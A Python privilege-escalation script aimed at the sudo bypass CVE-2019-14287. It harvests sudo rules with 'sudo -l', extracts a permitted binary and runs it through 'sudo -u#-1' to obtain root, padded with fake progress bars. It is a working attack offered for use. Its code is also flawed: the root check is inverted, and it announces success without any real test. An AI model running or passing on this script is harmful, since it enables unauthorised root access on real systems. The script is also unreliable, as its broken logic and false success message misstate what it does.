#!/usr/bin/python3

import os
import time

print("-------------------------------")
print(" # CVE : 2019-14287 Exploit # ")
print("-------------------------------\n")
# Check if the current user has root privileges
if os.getuid() != 0:
    print("You don't need an Sudo Security Bypass Exploitation, Cause You are ROOT !!! :) ")
    exit(1)
username = os.getlogin()
print(f"You are currently loged in as {username}....\n")
time.sleep(2)

print(f"*** Starting The Sudo Security Bypass Exploitation for User {username} !!!")
time.sleep(2)

def loading_bar1(duration):
    bar_width = 50
    increment = duration / bar_width
    print("Trying to Exploit ... ...")
    for _ in range(bar_width):
        print("-", end="", flush=True)
        time.sleep(increment)
    print("+++")

loading_bar1(5)  # Example: 5 seconds

def loading_bar2(duration):
    bar_width = 50
    increment = duration / bar_width
    for _ in range(bar_width):
        print("=", end="", flush=True)
        time.sleep(increment)
    print("+++")

try:
    os.system("sudo -l > priv")
    os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")
    with open("binary", "r") as binary_file:
        binary = binary_file.read().strip()
    os.system(f"sudo -u#-1 {binary}")
except Exception as e:
    print("An error occurred:", e)
else:
    print("Exploit executed successfully.\n")
    time.sleep(1)
    print("Checking if the exploit worked...\n")
    time.sleep(2)
    loading_bar2(2)
    if os.path.exists("ExploitFail"):
        print("This system is not vulnerable :(")
    else:
        print("You successfully gained ROOT access !!!")

# Clean up temporary files
try:
    os.remove("priv")
    os.remove("binary")
except Exception as e:
    print("Error cleaning up temporary files:", e)






